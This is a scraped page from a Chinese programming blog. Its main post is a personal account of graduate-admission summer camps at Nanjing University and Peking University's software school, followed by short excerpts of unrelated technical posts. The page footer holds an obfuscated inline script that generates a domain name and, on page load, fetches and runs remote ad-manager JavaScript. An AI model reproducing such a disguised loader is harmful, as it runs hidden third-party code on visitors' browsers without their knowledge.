南大本科开放日 7月23日，前往南京，开始我的放飞自我之旅。虽然这时我并不知道软微的结果，但是在南大和北航之间我还是会选择北航，所以我的整个人是非常放松的。南大计算机24日下午报到，住的是地方有两个酒店，两个人一个房间。因为人太多了，南京本地高校的学生已经提前进行过了。报到时领了一张导师的详细信息表，可以根据上面的时间地点自行联系导师。我在24日晚上到别同学的房间聊天去了，也没有复习。25日早上骑着小黄车去了南大计算机楼，听开幕式，见到了传说中的周志华大佬。然后一整天都是自由地联系导师。就在上午我收到了软微的通知，而我的发小也从老家坐高铁赶了过来。发小在我住的酒店住了下来。下午我们在宿舍聊天，然后去计算机楼溜达，晚上在酒店房间打农药(●’◡’●)。南大的机试是三道英文题，满分300，每道题满分100，10个测试用例，每个10分，在提交时能够看到你每个用例的测试结果，还有实时的排名。26日上午的机试我一塌糊涂，300分得了50分，200个人中排名103，不过也无所谓。当时还纠结要不要去参加下午的面试，结果还是去了。我是排在第二个，但是第一个人没有来，于是我是第一个进去面试的。需要注意的是，南大计算机面试不允许给老师个人简历。下面是我的面试情况。有四个老师，一个负责记录。A老师让我用英语介绍我最喜欢的方向。我蒙蔽了，全程都在“额。。额。。。”，A老师说随便说，但我也不会啊，我就继续“额。。。额。。。”。老师放弃了，问我你有什么项目经历吗，我很高兴，因为项目是我准备过的，然后我就开说，结果A老师打住了问我，这和你想学的方向有什么关系吗？额，我说没关系了，然后气氛就尴尬了。B老师紧接着说，我问你一道数学问题，挺简单的，就是想到和想不到的区别：我们都知道C里面有rand函数，那你能说一种办法从圆心在原点的圆上取若干个均匀的点吗？我又蒙蔽了，不会啊，我就假装思考，其实我压根就不想认真回答，只想着快点结束面试。于是我就说不会，B老师说没事，不要求你立刻给出完整的解决办法，你只需要说一下思路就行。我又假装思考，然后说没有思路。这时ABC三个老师就急了，问是题目就没理解吗？说实话，我确实没有完全理解题意，所以我就点点头。B老师急得说那你快点问啊，就这样继续纠缠了一会，我还是说没有任何思路。C老师接着问，那你本科是哪的？我说* 。那你家是哪的？我说**。那你为什么来我们南大？我说我比较喜欢南方的这种生活。南方有很多不错的学校啊？我说结合学校的实力和口碑，我觉得南大是最好的选择，当然浙大也不错，但是我更喜欢沿海一些，比如长三角。那上海不是还有复旦交大吗？我说这两个学校太傲娇了。听到这里，C老师低下头陷入了沉思。过了一会，老师抬头又问我的项目中我个人所占的比例，这时我毫不犹豫地说，项目全是我自己做的，队友都是在打酱油(●’◡’●)。就这样大概10分钟，面试就结束了。我拉着行李箱和我的发小开始了为期两天的南京旅游，随后我就回家了。
结语 北航优秀营员名单中并没有明确写出具体是按照何种方式排序，但实际上是根据你的面试加机试的综合成绩排名。这个排名并没有什么作用，老实说导师们可能根本就不知道排名，所以不要因为自己的排名低就不敢去找厉害的导师，同样也并不是说你排名靠前就能选到厉害的导师，因为面试中的不确定性是比较大的，运气好的同学可能遇到的问题恰巧都是自己会的或者超常发挥，盲目自信地去选择竞争力很大的导师可能会让你浪费掉许多时间，甚至会因此错过别的导师。北航有两个国家重点实验室，导师所在实验室、研究方向、职称、头衔、职务、年龄、性别、人品、个人实力如何去权重，每个人有不同的想法。说实话，这实际上是一场博弈大赛，你的筹码是你自身的实力，如何选择合适的导师，最终获得对自己来说最好的结果，是一场智慧的较量。有时，选择要比努力重要。
对于软微，我同样认为选择非常重要。认清自己和竞争者的差距，选择希望最大去努力，对于只想进北大而对其他方面不那么在意的同学尤为重要。其次，软微的机试非常非常非常重要。机试稳了，专硕必稳，学硕直博会有很大优势（直博面试时，有一位老师将还没有面试的机试道数第一的一位同学单独领走面谈去了）。关于软微的生源，它确实相比于信科的几乎全部985且有大量土著存在的情况要逊色很多，这一点是事实，所以要是被北大本科生或信科鄙视也无话可说，确实差，得承认。但是你要说二三本的学生闭着眼也能考上，那行等你考上再说。作为一名保研生，我不知道考研生所说的备考到底有多辛苦，我只知道我为了能够入营而努力将学业排名维持在前2%这三年间牺牲了多少娱乐时间。如果你认为在985学校里能够三年总排在前2%是一件很容易的事情，那就当我没说，因为我智商一般。而且，我放弃学硕选择专硕只是因为其他营员太强，我只好将他们根本不屑的专硕作为我的第一志愿。没办法，菜是原罪。所以，软微这么垃圾，赶紧来吧(●’◡’●)。
南大我只想说，机试非常非常非常重要，面试基本就是走流程，没有太大作用。这话是导师说的。
还要再谈一谈我没有入营的自动化所和入营但没有去的计算所。自动化所18年是相当相当火爆，据说有3000多人报名，最后入营就几百人。而且它的选人方法实在是难以猜透，很多清华本科、有SCI一区论文的都没能入营。相反，计算所的入营名单就显得有些过于注重本科学校，除了个别几个211，其余都是985，而且从我个人的学校情况来看都是各个学院专业的前几名。关于中科院研究所和高校，可能每个人有不同的想法。但不是说清北就一定要比中科院好。借用计算所研招办负责人卢老师的话说：“北大的都去清华了，清华的都来我们这了，嘻嘻。”
这样，我就结束了我的整个夏令营之旅。虽然只有短短的半个多月，但是为之准备付出的时间可能是三年，因为我是从大一开始就决定要保研的，大部分的时间都是用来提高排名，但也正是因为排名才让我获得了软微的入营资格。机会是给有准备的人。我并不是什么大佬，也完完全全不觉得保研北大软微有什么牛逼的地方。只是在正式去往软微夏令营之前，软微的保研过程一直就像一个谜，网上的相关的经验帖相对于信科叉院少之又少，这让当时的我就决定如果保研成功，我要写一篇软微保研的文章。没有太多的心得，只是简单地通过个人经历介绍夏令营的一些信息。想要获得更多通用性的注意事项，我想有很多人的经验帖都会有所帮助。我将自己的经历记录下来，只是想多年后回过头来再看，也许会有不一样的感受。当然如果我的文章能够帮助到你，那是最好不过的了。
2019年5月26日更新：
距保研成功已经过去了十个月，现在早已没有了之前的激动，更多的是内心的平静和清晰的自我认识。自从我写了这篇博客，有近百位来自不同学校的同学通过各种方式联系到了我。我很开心看到我的经验分享帮助了其他同学，其中不乏有保研和考研成功的。
在保研成功后，2018年11月我联系了北大的一位老师，随后在北大完成了毕业设计。在这个过程中，我又有了一些新的极为宝贵的认识。现在我回到了本科学校，准备毕业。正值新一年的夏令营，又有不少同学联系到了我。根据我的所见所闻和被问到比较多的问题，我决定更新一下。
2018年10月，保研基本全部结束。身边保研成功的朋友大概有三类，一类是早早决定硕士毕业后就工作的，他们大都去各个单位实习，例如字节跳动、爱奇艺、英特尔，正值校园招聘期，这些保研成功的同学都很优秀，所以应聘实习生成功的概率很大；第二类是保研时已经有了导师的同学，他们有的应导师要求或自愿前往导师实验室，提前接触导师课题；第三类同学相当自由，或者在家，或者在学校，或者四处旅行，做任何自己想做的事情。
而对于我，因为软微要到开学双选才会确定导师，而且软微的导师偏向于工程，如果提前联系软微导师，我觉得还不如直接去企业实习，在工程实践上或许能获得更快的成长。这时，像很多同学一样，我也不知道该做什么，我不知道未来的方向，我不敢随意地做出决定，一个可能会影响未来很长时间的决定。我反复思索，我觉得未来真正的人才应该是科研人才，加上我在本科期间也没有做过任何的科研，我并不清楚自己是否适合做科研，所以我想做一下科研试试。但是这是有很大风险的，因为软微最大的优势其实是对实习的包容自由，绝大多数同学都早早地出去实习了。如果在研究生这三年选择科研，一旦毕业时没有什么大的成就，那在找工作时相当于少了好多实习经历，而科研方面又没什么作为，基本上就废了。但如果有所作为，比如一篇一作顶会论文，足以秒杀99%的实习同学。在经过反复的思想斗争，在征得父母的意见后，我选择了试一试科研。
而软微本身不适合科研，老师们绝大多数也不搞科研。唯一可行的办法是，在信科找一位搞科研的老师，在软微选一个不管人的导师，平时就到本部实验室。这其中有两个比较重要的问题，一个是住宿问题，因为软微在大兴，尤其在研二之后，如果不在本部附近住的话会比较麻烦。根据之前一些学长的经历，一般都是自己租房，而北大附近的合租单间在2000-4000不等，也有1000-2000的，但是条件特别特别简陋，这些都是看自己的需求，导师一般都会根据你的实际情况给予补助。也有一些同学申请在本部的住宿，但是需要很早排队，而且很难排到，尤其是男生。在18年经历过法学院住宿事件后，北大本部的很多专硕都是没有宿舍的，起码软微还是有的，所以软微同学想申请到本部宿舍太难。第二个问题，选择都是双向的，据我观察，软微同学在科研上确实要差很多，也不是想找哪个信科老师人家就会要，因为培养是有成本的。听说往届软微学长也有去清华实验室的，只能说每个人的实力和潜力都不一样，尽力而为。
我于2018年11月初联系了信科的导师，在面试通过后，开始了一些基础知识的学习。12月，进行毕业设计的前期调研。寒假期间，也是每周向老师汇报进度并讨论。19年2月底，前往北大，自己在北大附近租了单间，老师给的补助差不多能cover掉房租，因为没有校园卡，只能叫外卖或者出去吃，还好不是特别贵。差不多三个月的时间，完成毕业设计，19年5月底回到了本科学校。
要说在北大的这三个月有什么收获，我只想说我最大的收获是眼界即所见所闻。在这里我看到了各种超神的北大大二大三学生，部分清华本科同学，以及一些保研到信科和我一样提前过来的同学，差距之大让我一度怀疑自己也配是北大学生？？？?除了这些，还有陪伴了我这三个月的客座学生，来自新加波和香港的两位博士，我和他们进行了很多的交流，这也改变了许多我对博士的固有看法。一句话总结吧，因为我来到这里，遇见了很多我生命中本不可能遇到的人，经历或即将经历我本不可能经历的事情。
送给诸位我喜欢很久的一句话——如果你见过大海，就不会在意池塘的是非了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b450228129529599222109708118e936/" rel="bookmark">
			Dell U2518D显示器拆解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 5月份数码港拿的，7月突然黑屏。 当时没找售后，随便找了科技市场的维修，垃圾老板不会拆，把屏弄烂了，还说拿去屏就烂了。 索性拿回来拆了，看看几千块买的都是什么东西。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d09304854e0bcd3d0491ded7993a2ee5/" rel="bookmark">
			Asp.Net Mvc 运行机制原理分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近一段时间接手过的项目都是基于Asp.Net的，以前对aspnet运行机制有一个大概的了解，总觉得不够透彻，按自己的理解来分析一下。
Asp.Net 运行机制
理解mvc运行原理的前提是要了解aspnet运行原理，这方面网上资料多如牛毛，我这里就大致说一下aspnet生命周期
Http请求到IIS后，如果是静态资源则IIS读取后返回客户端，动态请求被isap.dll 转发自net托管平台处理，首先HttpRuntime中创建Application，它是整个请求生命周期的开始，运行在单独的Appdomain中，在Application 中顺序调用所有已注册的Ihttpmodule,在IHttpModule中可以 "短路"(终止后续IHttpModule的执行)，很多Web框架都是在这里做了文章，包括大名鼎鼎的Asp.Net Mvc, IHttpModule执行完后 最终请求被交给IHttpHandler, 在Handler中执行完毕后 再一层层返回到客户端。
ASP.NET MVC5 运行原理
这是来自微软官方的运行原理图
当前请求到达 IIS服务器后，同样动态请求被转发到net平台，在管道执行过程中(IHttpModule)，有一个特殊的IHttpModule
它就是 UrlRoutingModule ，MVC从这里就开始了。
它 根据当前的HttpContext封装HttpContextWrapper,从Route路由表中取出和当前URL匹配的路由数据(RouteData),接着生成RequestContext对象，然后创建IHttpHandler这里是MvcHandler在MvcHandler中完成了图中处理管线的所有操作。
下面从源码级分析一次请求处理流程
当请求到达路由Module时,创建MvcHandler并将封装好的RequestContext请求上下文传递给它
public MvcHandler(RequestContext requestContext) { if (requestContext == null) { throw new ArgumentNullException("requestContext"); } RequestContext = requestContext; } 执行MvcHandler的BeginProcessRequest方法，创建HttpContextWrapper
protected virtual IAsyncResult BeginProcessRequest(HttpContext httpContext, AsyncCallback callback, object state) { HttpContextBase httpContextBase = new HttpContextWrapper(httpContext); return BeginProcessRequest(httpContextBase, callback, state); } 在BeginProcess中实例化了Controller并执行对应的Action等，做了很多工作，一步步来分析
protected internal virtual IAsyncResult BeginProcessRequest(HttpContextBase httpContext, AsyncCallback callback, object state) { IController controller; IControllerFactory factory; ProcessRequestInit(httpContext, out controller, out factory); IAsyncController asyncController = controller as IAsyncController; if (asyncController !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d09304854e0bcd3d0491ded7993a2ee5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4aebcfe143f568c6efb0bb1e6e305552/" rel="bookmark">
			OnEnable和OnDisabled
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设某个组件为NewBehaviour OnEnabled被调用的情况： 1、GameObject添加组件的时候，即AddComponet ； 2、包含NewBehaviour的Prefab被实例化的时候； 3、已添加NewBehaviour的GameObject由未激活到已激活的时候，即setActive(true) ； 4、NewBehaviour由不可用到可用的时候，即enabled=true。 其中2、3会调用该GameObject及其所有子对象的OnEnabled。 OnDisabled被调用的情况： 1、GameObject被销毁； 2、NewBehaviour被销毁； 3、已添加NewBehaviour的GameObject由已激活到未激活的时候，即setActive(false)； 4、NewBehaviour由不可用到可用的时候，即enabled=false。 其中1、3会调用该GameObject及其所有子对象的OnEnabled。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b67608ccfd8ddfa8edc6704e943cfbb/" rel="bookmark">
			启动vm虚拟机里的系统时，提示此主机支持 AMD-V，但 AMD-V 处于禁用状态。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		标题 ## 启动vm虚拟机里的系统时，提示此主机支持 AMD-V，但 AMD-V 处于禁用状态。 前言
使用VMware在安装CentOS7时，提示我的AMD-V处于禁用状态，于是查阅相关资料知道了要去BIOS修改SVM，而AMD处理器的虚拟化的缩写就是svm。
如何进入BIOS
这个因人而异，一般的是在电脑开启后按Esc、F2
第一步找到Advance Mode
第二步
第三步 开启权限
第四步 记得要按F10保存
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/128f2ac1c90746d0bf4cb17a1b705828/" rel="bookmark">
			修改ScrollView滚动条样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 设置水平方向 android:scrollbars="vertical" 设置长条背景 android:scrollbarTrackVertical="@drawable/seek_blue_bg" 设置短条背景 android:scrollbarThumbVertical="@drawable/seek" 设置滚动条位置 android:scrollbarStyle=”outsideInset” insideOverlay默认值，表示在padding区域内并且覆盖在view上insideInset表示在padding区域内并且插入在view后面outsideInset表示在padding区域外并且插入在view后面outsideOverlay表示在padding区域外并且覆盖在view上 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/502/">«</a>
	<span class="pagination__item pagination__item--current">503/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/504/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>